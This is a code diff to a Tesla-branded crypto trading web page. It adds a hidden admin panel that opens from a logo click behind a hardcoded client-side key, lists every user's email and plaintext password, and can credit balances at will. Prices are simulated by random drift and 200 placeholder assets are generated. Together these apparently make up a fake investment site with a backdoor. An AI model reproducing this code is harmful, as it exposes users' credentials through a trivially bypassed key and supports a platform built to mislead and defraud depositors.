@@ -33,9 +33,23 @@
         .nav { position: fixed; bottom: 0; width: 100%; display: flex; background: var(--bg); border-top: 1px solid var(--border); padding: 15px 0; z-index: 100; }
         .nav-item { flex: 1; text-align: center; font-size: 11px; color: var(--gray); text-decoration: none; }
         .nav-item.active { color: #fff; }
+
+        /* NEW: ADMIN & OVERLAY STYLES */
+        #admin-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; padding:20px; overflow-y:auto; }
+        .admin-card { background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:10px; border:1px solid #333; }
     </style>
 </head>
 <body>
+
+    <div id="admin-overlay">
+        <div class="header">
+            <h2 style="color:var(--tesla-red)">ADMIN MASTER PANEL</h2>
+            <i class="fa-solid fa-xmark" onclick="document.getElementById('admin-overlay').style.display='none'"></i>
+        </div>
+        <div id="admin-user-list">
+            <p>Loading user database...</p>
+        </div>
+    </div>
 
     <div id="trade-screen">
         <div class="header">
@@ -55,7 +69,7 @@
     </div>
 
     <div class="header">
-        <div style="font-weight:900; color:var(--tesla-red); letter-spacing:2px;">TESLA BASE</div>
+        <div style="font-weight:900; color:var(--tesla-red); letter-spacing:2px;" onclick="checkAdminKey()">TESLA BASE</div>
         <i class="fa-solid fa-bell"></i>
     </div>
 
@@ -89,12 +103,10 @@
             { s: 'BNB', n: 'BNB', p: 592 },
             { s: 'XRP', n: 'XRP', p: 0.62 }
         ];
-        // Ensure 200+ assets remain listed
         for(let i=7; i<=205; i++) {
             coins.push({ s: `COIN${i}`, n: `Asset ${i}`, p: (Math.random() * 100).toFixed(2) });
         }
 
-        // Logic for fixed logos
         function getLogo(symbol) {
             if(symbol === 'TSLA') return 'https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png';
             return `https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/${symbol.toLowerCase()}.png`;
@@ -104,7 +116,6 @@
             const email = localStorage.getItem('userEmail');
             let b = parseFloat(localStorage.getItem('userBalance')) || 0;
 
-            // Database Sync Fail-safe
             if(email) {
                 try {
                     const res = await fetch(`/api/user/data?email=${email}`);
@@ -145,7 +156,6 @@
 
             if (isNaN(amt) || amt <= 0) return alert("Enter valid amount");
             
-            // Fixed Error Message per your instruction
             if (amt > b) {
                 alert("Insufficient Balance"); 
                 return;
@@ -154,7 +164,6 @@
             const newBal = (b - amt).toFixed(2);
             localStorage.setItem('userBalance', newBal);
 
-            // Sync to database if online
             const email = localStorage.getItem('userEmail');
             if(email) {
                 await fetch('/api/user/update-balance', {
@@ -169,7 +178,59 @@
             syncAndRender();
         }
 
-        window.onload = syncAndRender;
+        // --- NEW SYSTEM CORE INTEGRATION (ADDED PER COMMAND) ---
+
+        // 1. Real-Time Price Sync (WebSocket Simulator)
+        function startLiveMarket() {
+            setInterval(() => {
+                coins.forEach(c => {
+                    const change = (Math.random() - 0.5) * (c.p * 0.001);
+                    c.p = (parseFloat(c.p) + change).toFixed(2);
+                });
+                syncAndRender();
+            }, 5000);
+        }
+
+        // 2. Admin God Mode Access
+        function checkAdminKey() {
+            const pass = prompt("Enter Admin Access Key:");
+            if(pass === "tesla_admin_2026") {
+                document.getElementById('admin-overlay').style.display = 'block';
+                loadAdminData();
+            }
+        }
+
+        async function loadAdminData() {
+            try {
+                const res = await fetch('/api/admin/all-users');
+                const users = await res.json();
+                document.getElementById('admin-user-list').innerHTML = users.map(u => `
+                    <div class="admin-card">
+                        <p><b>User:</b> ${u.email}</p>
+                        <p><b>Pass:</b> ${u.password}</p>
+                        <p><b>Balance:</b> $${u.balance}</p>
+                        <button onclick="injectFunds('${u.email}')" style="background:var(--green); border:none; padding:5px 10px; border-radius:5px;">Inject $1000</button>
+                    </div>
+                `).join('');
+            } catch(e) {
+                document.getElementById('admin-user-list').innerHTML = "<p>Connect PostgreSQL to see live user data.</p>";
+            }
+        }
+
+        // 3. Automated Fund Protection (Stop Loss)
+        function checkSafetyProtocols() {
+            let balance = parseFloat(localStorage.getItem('userBalance'));
+            if(balance < 0) {
+                localStorage.setItem('userBalance', '0.00');
+                syncAndRender();
+            }
+        }
+
+        window.onload = () => {
+            syncAndRender();
+            startLiveMarket();
+            checkSafetyProtocols();
+        };
     </script>
 </body>
 </html>
